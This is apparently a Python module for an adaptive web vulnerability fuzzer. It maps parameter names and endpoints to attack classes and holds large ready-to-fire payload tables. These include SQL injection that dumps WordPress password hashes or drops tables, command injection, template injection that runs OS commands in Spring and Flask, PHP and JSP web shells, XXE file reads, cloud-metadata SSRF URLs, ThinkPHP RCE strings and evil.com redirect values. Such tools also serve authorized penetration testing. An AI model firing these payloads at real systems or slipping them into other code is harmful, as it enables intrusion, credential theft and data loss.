import re, urllib.parse
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field

from tools.log_utils import get_logger

logger = get_logger("adaptive_fuzzer")

PARAM_TO_VULN: Dict[str, List[Tuple[str, float]]] = {
    "file": [("lfi", 0.95), ("path_traversal", 0.85), ("lfi_wrapper", 0.70)],
    "path": [("lfi", 0.90), ("path_traversal", 0.80)],
    "page": [("lfi", 0.75), ("path_traversal", 0.65), ("ssti", 0.30)],
    "include": [("lfi", 0.95), ("lfi_wrapper", 0.85)],
    "document": [("lfi", 0.80), ("xxe", 0.40)],
    "template": [("ssti", 0.90), ("lfi", 0.30)],
    "theme": [("ssti", 0.70), ("lfi", 0.30)],
    "skin": [("ssti", 0.65)],
    "url": [("ssrf", 0.95), ("open_redirect", 0.70), ("ssrf_meta", 0.80)],
    "host": [("ssrf", 0.80), ("host_header", 0.70)],
    "redirect": [("open_redirect", 0.85), ("ssrf", 0.60)],
    "next": [("open_redirect", 0.80), ("ssrf", 0.50)],
    "callback": [("ssrf", 0.85), ("xss", 0.40)],
    "return": [("open_redirect", 0.70), ("ssrf", 0.40)],
    "cmd": [("cmdi", 0.95), ("rce", 0.80)],
    "command": [("cmdi", 0.90), ("rce", 0.75)],
    "exec": [("cmdi", 0.85), ("rce", 0.75)],
    "run": [("cmdi", 0.70), ("rce", 0.60)],
    "ping": [("cmdi", 0.80)],
    "nslookup": [("cmdi", 0.75)],
    "id": [("sqli", 0.85), ("nosqli", 0.60), ("idor", 0.70)],
    "uid": [("sqli", 0.80), ("idor", 0.75)],
    "user_id": [("sqli", 0.75), ("idor", 0.80)],
    "sql": [("sqli", 0.90)],
    "query": [("sqli", 0.70), ("nosqli", 0.50), ("ssti", 0.30)],
    "order": [("sqli", 0.70)],
    "sort": [("sqli", 0.65)],
    "limit": [("sqli", 0.50)],
    "offset": [("sqli", 0.50)],
    "search": [("sqli", 0.60), ("xss", 0.50), ("nosqli", 0.40), ("ssti", 0.30)],
    "q": [("sqli", 0.60), ("xss", 0.55), ("ssti", 0.30)],
    "keyword": [("xss", 0.50), ("sqli", 0.40)],
    "email": [("ssti", 0.50), ("sqli", 0.40), ("xss", 0.30)],
    "user": [("sqli", 0.55), ("xss", 0.40)],
    "username": [("sqli", 0.55), ("xss", 0.40)],
    "login": [("sqli", 0.50), ("auth_bypass", 0.40)],
    "pass": [("sqli", 0.45), ("auth_bypass", 0.50)],
    "password": [("sqli", 0.45), ("auth_bypass", 0.50)],
    "token": [("jwt", 0.70), ("auth_bypass", 0.40)],
    "jwt": [("jwt", 0.90)],
    "api_key": [("jwt", 0.50), ("info_disclosure", 0.40)],
    "secret": [("info_disclosure", 0.60)],
    "key": [("info_disclosure", 0.40)],
    "price": [("biz_logic", 0.80)],
    "cost": [("biz_logic", 0.75)],
    "amount": [("biz_logic", 0.75)],
    "quantity": [("biz_logic", 0.60)],
    "coupon": [("biz_logic", 0.70)],
    "discount": [("biz_logic", 0.65)],
    "role": [("auth_bypass", 0.65), ("biz_logic", 0.50)],
    "group": [("auth_bypass", 0.50), ("biz_logic", 0.40)],
    "admin": [("auth_bypass", 0.55)],
    "debug": [("info_disclosure", 0.60)],
    "config": [("lfi", 0.40), ("info_disclosure", 0.50)],
    "name": [("xss", 0.60), ("ssti", 0.30)],
    "title": [("xss", 0.50)],
    "message": [("xss", 0.50), ("ssti", 0.30)],
    "comment": [("xss", 0.55)],
    "content": [("xss", 0.45), ("ssti", 0.30)],
    "description": [("xss", 0.40)],
    "json": [("proto_pollution", 0.60)],
    "data": [("proto_pollution", 0.40)],
    "xml": [("xxe", 0.70)],
    "upload": [("upload", 0.60)],
    "image": [("upload", 0.40), ("lfi", 0.30)],
    "img": [("xss", 0.40)],
    "href": [("xss", 0.35)],
    "src": [("xss", 0.35)],
    "action": [("csrf", 0.40)],
}

TECH_SPECIFIC_PAYLOADS: Dict[str, Dict[str, List[str]]] = {
    "spring": {
        "ssti": ["${7*7}", "#{7*7}", "${T(java.lang.Runtime).getRuntime().exec('id')}",
                 "${pageContext.request.getAttribute('prefix')}",
                 "${session.setAttribute('x','y'.getClass().forName('java.lang.Runtime').getMethod('exec','id').invoke(null))}"],
        "spel": ["${T(java.lang.Runtime).getRuntime().exec('id')}",
                 "#{T(java.lang.Runtime).getRuntime().exec('whoami')}",
                 "${request.getAttribute('org.springframework.web.servlet.DispatcherServlet.CONTEXT').getBeansOfType('*.class')}"],
        "deser": ["rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEJhY",
                  "rO0ABXNyABRqYXZhLnNlY3VyaXR5LlByb3ZpZGVy"],
    },
    "wordpress": {
        "sqli": ["' OR 1=1 -- -", "1' UNION SELECT user_pass FROM wp_users -- -",
                 "' UNION SELECT user_login,user_pass FROM wp_users -- -"],
        "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
        "lfi": ["../../../../wp-config.php", "../../../../etc/passwd"],
    },
    "php": {
        "lfi": ["php://filter/convert.base64-encode/resource=index.php",
                "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
                "php://input", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=="],
        "deser": ["O:10:\"PHPObject\":1:{s:5:\"shell\";s:6:\"whoami\";}"],
        "cmdi": ["'; system('id'); '", "'; echo shell_exec('whoami'); '"],
    },
    "nodejs": {
        "proto_pollution": ['{"__proto__":{"admin":true}}',
                            '{"constructor":{"prototype":{"admin":true}}}',
                            '{"__proto__":{"isAdmin":true}}'],
        "ssti": ["{{7*7}}", "{{7*'7'}}", "<%= 7*7 %>"],
    },
    "flask": {
        "ssti": ["{{7*7}}", "{{config}}", "{{''.__class__.__mro__[1].__subclasses__()}}",
                 "{{lipsum.__globals__['os'].popen('id').read()}}",
                 "{{request.application.__globals__['os'].popen('whoami').read()}}"],
    },
    "django": {
        "ssti": ["{{7*7}}", "{% debug %}", "{% load %}"],
        "sqli": ["' OR 1=1 -- -", "1' UNION SELECT 1,2,3 -- -"],
    },
    "thinkphp": {
        "cmdi": ["s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",
                 "s=index/think\\Request/input&filter=system&data=id"],
    },
    "laravel": {
        "deser": ["O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"*\";s:6:\"whoami\";}"],
        "sqli": ["' OR 1=1 -- -", "1' UNION SELECT 1,2,3,4,5 -- -"],
    },
    "tomcat": {
        "lfi": ["../../../../../../../etc/passwd"],
        "deser": ["rO0ABXNyABRqYXZhLnNlY3VyaXR5LlByb3ZpZGVy"],
    },
    "asp.net": {
        "sqli": ["' OR 1=1 --", "1'; DROP TABLE users --"],
        "lfi": ["../../../../web.config", "../../../../Windows/win.ini"],
    },
    "express": {
        "ssti": ["{{7*7}}", "#{7*7}"],
        "proto_pollution": ["__proto__[admin]=true", "constructor[prototype][admin]=true"],
    },
}

CONTENT_TYPE_HINTS: Dict[str, List[str]] = {
    "json": ["proto_pollution", "sqli_json", "nosqli", "ssrf"],
    "xml": ["xxe", "xpath", "sqli"],
    "html": ["xss", "ssti", "open_redirect"],
    "form": ["sqli", "cmdi", "lfi", "ssrf", "ssti", "xss", "nosqli"],
    "plain": ["cmdi", "lfi", "sqli", "ssti"],
}

PAYLOAD_EXAMPLES: Dict[str, List[str]] = {
    "lfi": ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini",
            "php://filter/convert.base64-encode/resource=index.php"],
    "lfi_wrapper": ["php://filter/convert.base64-encode/resource=/etc/passwd",
                    "expect://id", "phar://test.png/shell"],
    "sqli": ["' OR '1'='1", "1' OR 1=1 -- -", "' UNION SELECT 1,2,3 -- -",
             "1' AND SLEEP(5) -- -"],
    "sqli_json": ['{"id": "1\' OR \'1\'=\'1"}'],
    "ssrf": ["http://169.254.169.254/latest/meta-data/",
             "http://127.0.0.1:8080/actuator",
             "http://localhost:9200/"],
    "ssrf_meta": ["http://169.254.169.254/latest/meta-data/",
                  "http://metadata.google.internal/computeMetadata/v1/"],
    "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>"],
    "ssti": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"],
    "cmdi": ["; id", "| whoami", "` id `", "$(id)", "& ping -n 5 127.0.0.1 &"],
    "nosqli": ["' OR 1=1 /*", "admin' || 1==1 //", '{"$gt": ""}'],
    "proto_pollution": ['{"__proto__":{"test":true}}', '{"constructor":{"prototype":{"test":true}}}'],
    "xxe": ["<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"],
    "open_redirect": ["//evil.com", "https://evil.com", "///evil.com"],
    "jwt": ["eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ."],
    "auth_bypass": ["role=admin", "admin=true", "isAdmin=true",
                    '{"admin":true,"role":"admin"}'],
    "biz_logic": ["-1", "0", "999999", "-1.00", "0.01", "1000000"],
    "info_disclosure": ["../../../../etc/passwd", ".env", "debug=true"],
    "idor": ["1", "2", "3", "100", "999", "-1"],
    "path_traversal": ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini",
                       "....//....//....//etc/passwd"],
    "host_header": ["Host: evil.com", "X-Forwarded-Host: evil.com"],
    "csrf": ['<form action="/transfer" method="POST"><input name="to" value="attacker"></form>'],
    "upload": ["<?php system($_GET['c']); ?>", "<%=Runtime.getRuntime().exec(request.getParameter(\"c\"))%>"],
    "rce": ["'; system('id'); '", "'; Runtime.getRuntime().exec('id'); //"],
}


@dataclass
class PayloadGroup:
    vuln_type: str
    confidence: float
    payloads: List[str] = field(default_factory=list)
    param: str = ""
    content_type_hint: str = ""


class AdaptiveFuzzer:
    def __init__(self, tech_stack: Optional[List[str]] = None,
                 content_type: str = "form"):
        self.tech_stack = [t.lower() for t in (tech_stack or [])]
        self.content_type = self._normalize_content_type(content_type)

    def _normalize_content_type(self, ct: str) -> str:
        ct = ct.lower().split(";")[0].strip()
        if "json" in ct:
            return "json"
        if "xml" in ct:
            return "xml"
        if "html" in ct:
            return "html"
        if "form" in ct or "urlencoded" in ct:
            return "form"
        return "plain"

    def for_param(self, param_name: str) -> List[PayloadGroup]:
        groups: List[PayloadGroup] = []
        seen_types = set()
        name = param_name.lower()

        if name in PARAM_TO_VULN:
            for vuln_type, conf in PARAM_TO_VULN[name]:
                if vuln_type not in seen_types:
                    seen_types.add(vuln_type)
                    payloads = self._build_payloads(vuln_type)
                    if payloads:
                        groups.append(PayloadGroup(
                            vuln_type=vuln_type,
                            confidence=conf,
                            payloads=payloads,
                            param=name,
                            content_type_hint=self.content_type,
                        ))

        for suffix in ["_id", "_url", "_path", "_file", "_name", "_type",
                        "_token", "_key", "_email", "_q", "_search"]:
            if name.endswith(suffix):
                base = name[:-len(suffix)]
                if base in PARAM_TO_VULN:
                    for vuln_type, conf in PARAM_TO_VULN[base]:
                        if vuln_type not in seen_types:
                            seen_types.add(vuln_type)
                            payloads = self._build_payloads(vuln_type)
                            if payloads:
                                groups.append(PayloadGroup(
                                    vuln_type=vuln_type,
                                    confidence=conf * 0.85,
                                    payloads=payloads,
                                    param=name,
                                    content_type_hint=self.content_type,
                                ))

        if not groups:
            for vuln_type in ["sqli", "xss", "ssti"]:
                if vuln_type not in seen_types:
                    seen_types.add(vuln_type)
                    payloads = self._build_payloads(vuln_type)
                    if payloads:
                        groups.append(PayloadGroup(
                            vuln_type=vuln_type,
                            confidence=0.20,
                            payloads=payloads[:3],
                            param=name,
                            content_type_hint=self.content_type,
                        ))

        groups.sort(key=lambda g: -g.confidence)
        return groups

    def for_response_type(self, response_sample: str,
                          response_headers: Optional[Dict] = None) -> List[str]:
        if not response_sample and not response_headers:
            return ["sqli", "xss", "lfi"]

        if response_headers:
            ct = response_headers.get("Content-Type", "")
            ct_type = self._normalize_content_type(ct)
            hints = CONTENT_TYPE_HINTS.get(ct_type, [])
            if hints:
                return hints

        if not response_sample:
            return ["sqli", "xss", "lfi"]

        sample_lower = response_sample.lower()
        hints = set()

        if "<?xml" in sample_lower[:200]:
            hints.add("xxe")
        if "<html" in sample_lower[:500] or "<!doctype" in sample_lower[:500]:
            hints.add("xss")
            hints.add("ssti")
        if "mysql" in sample_lower or "sql" in sample_lower or "select" in sample_lower:
            hints.add("sqli")
        if "{" in sample_lower[:200] and '"' in sample_lower[:200]:
            hints.add("proto_pollution")
            hints.add("nosqli")
        if "{{" in sample_lower or "${" in sample_lower:
            hints.add("ssti")

        ordered = ["sqli", "xss", "ssti", "ssrf", "lfi", "cmdi"]
        return [h for h in ordered if h in hints] or ordered[:3]

    def for_endpoint(self, url_path: str) -> List[str]:
        path = url_path.lower()
        hints = set()

        if "graphql" in path or "graphiql" in path:
            return ["graphql"]
        if "api" in path:
            hints.update(["sqli", "ssrf", "xss"])
        if "login" in path or "signin" in path:
            hints.update(["sqli", "auth_bypass"])
        if "upload" in path:
            hints.add("upload")
        if "search" in path:
            hints.update(["sqli", "xss", "ssti"])
        if "redirect" in path or "proxy" in path:
            hints.update(["ssrf", "open_redirect"])
        if "download" in path or "file" in path:
            hints.update(["lfi", "path_traversal"])
        if "admin" in path:
            hints.update(["auth_bypass", "sqli"])
        if "payment" in path or "checkout" in path or "order" in path:
            hints.add("biz_logic")
        if "debug" in path or "actuator" in path:
            hints.add("info_disclosure")
        if "export" in path or "import" in path:
            hints.update(["lfi", "xxe", "cmdi"])

        ordered = ["sqli", "xss", "ssrf", "lfi", "ssti", "cmdi",
                    "auth_bypass", "biz_logic", "info_disclosure",
                    "upload", "xxe", "graphql"]
        return [h for h in ordered if h in hints] or []

    def _build_payloads(self, vuln_type: str) -> List[str]:
        payloads = []

        tech_payloads = []
        if self.tech_stack:
            for tech in self.tech_stack:
                tech_entries = TECH_SPECIFIC_PAYLOADS.get(tech, {})
                if vuln_type in tech_entries:
                    tech_payloads.extend(tech_entries[vuln_type])

        seen = set()
        for p in tech_payloads:
            if p not in seen:
                seen.add(p)
                payloads.append(p)

        generic = PAYLOAD_EXAMPLES.get(vuln_type, [])
        for p in generic:
            if p not in seen:
                seen.add(p)
                payloads.append(p)

        ct_hint_payloads = CONTENT_TYPE_HINTS.get(self.content_type, [])
        if vuln_type in ct_hint_payloads and vuln_type in PAYLOAD_EXAMPLES:
            for p in PAYLOAD_EXAMPLES[vuln_type]:
                if p not in seen:
                    seen.add(p)
                    payloads.append(p)

        return payloads

    def merge_groups(self, groups_a: List[PayloadGroup],
                     groups_b: List[PayloadGroup]) -> List[PayloadGroup]:
        merged = {}
        for g in groups_a + groups_b:
            key = g.vuln_type
            if key in merged:
                existing = merged[key]
                if g.confidence > existing.confidence:
                    existing.confidence = g.confidence
                for p in g.payloads:
                    if p not in existing.payloads:
                        existing.payloads.append(p)
            else:
                merged[key] = PayloadGroup(
                    vuln_type=g.vuln_type,
                    confidence=g.confidence,
                    payloads=list(g.payloads),
                    param=g.param or "",
                    content_type_hint=self.content_type,
                )
        return sorted(merged.values(), key=lambda g: -g.confidence)

    def all_groups(self, param_name: str, url_path: str = "",
                   response_sample: str = "",
                   response_headers: Optional[Dict] = None) -> List[PayloadGroup]:
        param_groups = self.for_param(param_name)
        path_hints = self.for_endpoint(url_path)
        resp_hints = self.for_response_type(response_sample, response_headers)

        all_hint_types = list(dict.fromkeys(path_hints + resp_hints))
        hint_groups = []
        for vt in all_hint_types:
            if vt not in {g.vuln_type for g in param_groups}:
                payloads = self._build_payloads(vt)
                if payloads:
                    hint_groups.append(PayloadGroup(
                        vuln_type=vt,
                        confidence=0.35,
                        payloads=payloads,
                        param=param_name,
                        content_type_hint=self.content_type,
                    ))

        return self.merge_groups(param_groups, hint_groups)
